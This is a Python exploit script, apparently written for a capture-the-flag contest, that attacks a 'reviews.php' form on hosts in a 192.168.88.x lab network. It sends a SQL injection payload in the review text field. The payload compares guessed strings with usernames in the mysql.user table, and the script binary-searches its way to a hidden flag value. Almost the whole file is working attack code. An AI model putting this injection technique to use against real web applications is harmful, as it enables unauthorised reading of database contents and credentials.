#!/usr/bin/env python3

from socket import SHUT_RDWR, create_connection
from time import sleep
from tokenize import cookie_re
import requests as req
import re
from math import floor, gcd

vulnerable = [103]

def intToFlag(i):
  a = i % 52
  b = floor(i / 52) % 52
  c = floor(i / (52**2)) % 52
  d = floor(i / (52**3)) % 52
  e = floor(i / (52**4)) % 52
  f = floor(i / (52**5)) % 52
  g = floor(i / (52**6)) % 52
  h = floor(i / (52**7)) % 52

  # print(a, b, c, d, e, f, g, h)

  if a < 26:
    res = chr(65 + a)
  else:
    res = chr(71 + a)

  if b < 26:
    res = chr(65 + b) + res
  else:
    res = chr(71 + b) + res

  if c < 26:
    res = chr(65 + c) + res
  else:
    res = chr(71 + c) + res

  if d < 26:
    res = chr(65 + d) + res
  else:
    res = chr(71 + d) + res

  if e < 26:
    res = chr(65 + e) + res
  else:
    res = chr(71 + e) + res
  
  if f < 26:
    res = chr(65 + f) + res
  else:
    res = chr(71 + f) + res

  if g < 26:
    res = chr(65 + g) + res
  else:
    res = chr(71 + g) + res

  if h < 26:
    res = chr(65 + h) + res
  else:
    res = chr(71 + h) + res

  return res

# allFlags = [intToFlag(i) for i in range(53459728531456)]

for i in vulnerable:
  serverAdress = f"192.168.88.{i}"
  url = "http://" + serverAdress + "/reviews.php"

  min = 0
  max = 53459728531456 - 1
  finished = False

  print(f"Searching {i}")
  
  while not finished:
    midVal = floor(min + (max - min) / 2)

    params = {'review_text': f"wubbel', (SELECT STRCMP(User, BINARY 'fl{{MY-{intToFlag(midVal)}}}') + 2 FROM mysql.user WHERE User like 'fl{{MY-%')); #",
              'review_score': '5', 'submit': 'Review+it!'}
    newR = req.post(url, data=params)

    print(f"Searching from {intToFlag(min)} to {intToFlag(max)}. Input the score:")
    x = int(input())

    if x == 2:
      print(f"{i}: fl{{MY-{intToFlag(midVal)}}}")
      finished = True
    elif x == 1:
      max = midVal
    elif x == 3:
      min = midVal +1
    
  
